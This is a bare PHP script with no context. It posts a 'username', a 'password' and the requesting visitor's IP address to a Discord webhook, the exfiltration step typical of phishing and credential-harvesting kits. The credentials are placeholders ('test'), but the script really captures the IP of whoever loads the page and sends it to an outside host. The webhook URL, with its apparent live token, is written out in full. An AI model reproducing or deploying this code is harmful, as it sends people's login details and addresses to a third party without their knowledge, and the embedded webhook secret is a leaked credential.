<?php
$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1112488388340228116/GXs4qTQkiBfB0ZENatdpyitbMAj3Bgcwvy5cgYBYw2GqtZh39kVO92L4Ns0faeKIaO4I');
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ['content' => "```ini\nusername=test\npassword=test\nip=${_SERVER['REMOTE_ADDR']}```"]);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30); 
		curl_setopt($ch, CURLOPT_TIMEOUT, 0);
		curl_exec($ch);
		?>